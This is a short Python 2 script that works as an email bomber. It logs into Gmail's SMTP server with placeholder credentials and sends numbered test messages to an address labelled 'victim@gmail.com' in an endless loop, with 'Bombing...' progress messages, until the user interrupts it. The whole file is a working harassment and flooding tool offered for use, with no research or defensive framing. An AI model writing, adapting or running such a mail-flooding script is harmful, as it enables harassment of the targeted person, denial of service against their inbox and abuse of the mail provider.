import time
import smtplib
from collections import OrderedDict

interval_dict = OrderedDict([("Y", 365*86400),  # 1 year
                             ("M", 30*86400),   # 1 month
                             ("W", 7*86400),    # 1 week
                             ("D", 86400),      # 1 day
                             ("h", 3600),       # 1 hour
                             ("m", 60),         # 1 minute
                             ("s", 1)])         # 1 second

def seconds_to_human(seconds):
    """Convert seconds to human readable format like 1M.

    :param seconds: Seconds to convert
    :type seconds: int

    :rtype: int
    :return: Human readable string
    """
    seconds = int(seconds)
    string = ""
    for unit, value in interval_dict.items():
        subres = seconds / value
        if subres:
            seconds -= value * subres
            string += str(subres) + unit
    return string



def setup_server():
    gmail_user = "user@gmail.com"
    gmail_pwd  = "password"
    server = smtplib.SMTP("smtp.gmail.com:587") #or port 465 doesn't seem to work!
    server.starttls()
    server.login(gmail_user, gmail_pwd)
    return server

def send_mail():
    FROM       = 'user@gmail.com'
    TO         = ['victim@gmail.com'] #must be a list
    SUBJECT    = "Test Mail "
    TEXT       = "Testing sending mail using gmail servers"

    try:
        print "Setting up bomb server...."
        server = setup_server()
        
        print "Bombing... Press Ctrl + C To Stop"
        start_time = time.time()
        count = 0
        while True:
            if not count%5 and count > 0:
                print "Sent : {} in {}".format(count, seconds_to_human(time.time() - start_time))

            MESSAGE = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), SUBJECT + str(count), TEXT)
            server.sendmail(FROM, TO, MESSAGE)
            count += 1

    except KeyboardInterrupt:
        print '\rSuccessfully sent {0} mails in {1}'.format(count, seconds_to_human(time.time() - start_time))

if __name__ == '__main__':
    send_mail()
